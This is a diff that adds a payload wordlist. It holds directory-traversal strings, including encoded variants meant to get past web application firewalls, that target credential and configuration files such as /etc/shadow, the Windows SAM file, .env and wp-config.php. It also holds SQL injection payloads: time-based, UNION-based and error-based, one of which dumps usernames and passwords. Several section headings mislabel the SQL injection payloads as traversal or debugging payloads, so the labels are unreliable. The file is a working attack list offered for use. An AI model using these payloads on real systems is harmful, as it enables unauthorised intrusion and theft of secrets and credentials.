@@ -1,0 +1,148 @@
+# ------------------------------
+# Basic Reverse Traversal Payloads
+# ------------------------------
+../../
+..%2F..%2F
+%2e%2e%2f
+..\\..\\
+..%2F..%2F
+%2e%2e\\
+..%5C..%5C
+..%5C%2E%5C
+%2E%2E%5C
+%2E%2E%2F
+..%2F..%2F..%2F
+../../../../../
+%2E%2E%2F%2E%2E%2F%2E%2E%2F
+..\\..\\..\\..\\..\\
+..\\%2E\\..\\%2E\\
+..%5C..%5C..%5C..%5C
+..%2e%2e%2f%2e%2e%2f
+
+# ------------------------------
+# Windows Specific Payloads
+# ------------------------------
+..\\..\\..\\..\\..\\..\\Windows\\System32\\
+..\\..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe
+..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts
+..\\..\\..\\..\\..\\..\\Windows\\System32\\inetsrv\\config\\applicationHost.config
+..\\..\\..\\..\\..\\..\\Windows\\System32\\config\\SAM
+..\\..\\..\\..\\..\\..\\Windows\\System32\\wbem\\repository\\
+
+# ------------------------------
+# Linux Specific Payloads
+# ------------------------------
+../../../../../etc/passwd
+../../../../../etc/shadow
+../../../../../etc/hosts
+../../../../../etc/fstab
+../../../../../etc/ssh/sshd_config
+../../../../../var/www/html
+../../../../../var/log/auth.log
+../../../../../var/log/apache2/error.log
+../../../../../home/user/.bash_history
+../../../../../usr/local/bin
+
+# ------------------------------
+# Apple (macOS) Specific Payloads
+# ------------------------------
+../../../../../private/etc/passwd
+../../../../../private/etc/shadow
+../../../../../private/etc/sudoers
+../../../../../private/var/log/system.log
+../../../../../private/var/log/apache2/error_log
+../../../../../private/etc/apache2/httpd.conf
+../../../../../private/var/root/.bash_history
+../../../../../private/var/tmp
+../../../../../private/var/db/dslocal/nodes/Default/users
+
+# ------------------------------
+# General Web Application Firewall (WAF) Bypassing Payloads
+# ------------------------------
+../../../../../../..%2F..%2F..%2F..%2F
+..%252F..%252F..%252F
+%252e%252e%252f
+..%252F%252E%252F
+%2E%2E%252F%252E%2E%2F
+%252E%2E%2F%252E%2E%2F
+%252e%252e%2F%252e%252e%2F
+
+# ------------------------------
+# Advanced WAF Bypass Payloads
+# ------------------------------
+%27%20OR%201%3D1--
+%22%20OR%201%3D1--
+%27%20AND%201%3D2%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--
+%27%20AND%20SLEEP(5)--
+%27%23
+%27%2F*
+%27%2D%2D+
+%22%20AND%20EXTRACTVALUE%281,%20CONCAT%280x5c,%20%28SELECT%20DATABASE%28%29%29%29%29%29--+
+%2F**/SELECT%20*%20FROM%20mysql.user%20WHERE%20`user`%20LIKE%20'admin'--
+%2F**/SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+%27%2D%2D%20OR%20%27%27%3D%27--
+
+# ------------------------------
+# Software Exploitation Payloads (Targeting Known Vulnerabilities)
+# ------------------------------
+../../../../../usr/share/wordlists/rockyou.txt
+../../../../../usr/share/metasploit-framework/msf3/modules/exploits/linux/http/
+../../../../../var/www/html/.git/config
+../../../../../.env
+../../../../../.git/HEAD
+../../../../../.git/index
+../../../../../etc/mysql/my.cnf
+../../../../../var/www/html/wp-config.php
+../../../../../var/www/html/.htpasswd
+
+# ------------------------------
+# Traversal Through Common Directories and Files
+# ------------------------------
+/../..//..//..//..//etc/passwd
+/..//../..//..//var/www/html/.git/config
+../../../../../etc/apache2/apache2.conf
+../../../../../var/www/html/.git/objects/
+../../../../../var/www/html/.git/refs/heads/
+
+# ------------------------------
+# Time-Based Reverse Traversal Detection
+# ------------------------------
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+' OR IF(1=1, SLEEP(5), 0)--
+" OR pg_sleep(5)--
+') AND SLEEP(5)--
+' AND pg_sleep(5) AND '1'='1
+' OR BENCHMARK(1000000,MD5('test'))--
+" OR BENCHMARK(1000000,MD5('test'))--
+' OR IF(1=1, BENCHMARK(1000000,MD5('test')), 0)--
+' AND BENCHMARK(1000000,MD5('test'))--
+' AND IF(1=1, BENCHMARK(1000000,MD5('test')), 0)--
+' OR IF(1=1, SLEEP(5), NULL)--
+' AND IFNULL(NULL, SLEEP(5))--
+
+# ------------------------------
+# Advanced Reverse Traversal Payloads for Debugging
+# ------------------------------
+' UNION SELECT version(),user()--
+' AND (SELECT DATABASE())--
+' AND IF(1=1,BENCHMARK(1000000,MD5(1)),0)--
+' AND (SELECT table_schema FROM information_schema.tables LIMIT 1)--
+' AND (SELECT table_name FROM information_schema.tables WHERE table_name='users')--
+' UNION SELECT 1,2,group_concat(username,':',password) FROM users--
+' OR IFNULL((SELECT DATABASE()),0)--
+' OR IFNULL(user(),0)--
+' AND (SELECT GROUP_CONCAT(user()) FROM mysql.user)--
+' AND (SELECT GROUP_CONCAT(database()) FROM information_schema.tables)--
+' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables LIMIT 1)--
+' OR EXTRACTVALUE(1, CONCAT(0x5c, (SELECT VERSION())))--
+' AND (SELECT COUNT(*) FROM mysql.user) --
+
+# ------------------------------
+# Custom Reverse Traversal Debugging Payloads
+# ------------------------------
+../../../../../../../etc/shadow
+../../../../../../../etc/passwd
+../../../../../../../var/www/html/.git/config
+../../../../../../../.git/HEAD
+../../../../../../../.git/index
